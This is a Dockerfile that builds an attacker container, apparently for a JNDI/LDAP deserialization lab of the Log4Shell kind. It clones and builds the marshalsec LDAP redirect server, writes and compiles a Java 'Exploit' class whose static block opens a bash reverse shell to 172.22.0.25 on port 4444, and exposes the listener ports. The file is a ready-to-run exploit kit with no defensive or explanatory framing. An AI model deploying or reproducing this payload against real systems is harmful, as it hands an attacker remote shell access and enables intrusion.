FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    default-jdk-headless python3 netcat-openbsd wget git maven && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /exploit

# Build marshalsec LDAP redirect server
RUN git clone --depth 1 https://github.com/mbechler/marshalsec.git /exploit/marshalsec && \
    cd /exploit/marshalsec && \
    mvn -q clean package -DskipTests 2>/dev/null || true

# Create the exploit payload — reverse shell back to attacker
RUN echo 'import java.io.IOException;\n\
public class Exploit {\n\
    static {\n\
        try {\n\
            Runtime.getRuntime().exec(new String[]{\n\
                "/bin/bash", "-c",\n\
                "bash -i >& /dev/tcp/172.22.0.25/4444 0>&1"\n\
            });\n\
        } catch (IOException e) { e.printStackTrace(); }\n\
    }\n\
}' > /exploit/Exploit.java && \
    javac -source 8 -target 8 /exploit/Exploit.java 2>/dev/null || true

COPY start.sh /exploit/start.sh
RUN chmod +x /exploit/start.sh

EXPOSE 1389 8888 4444

CMD ["/exploit/start.sh"]
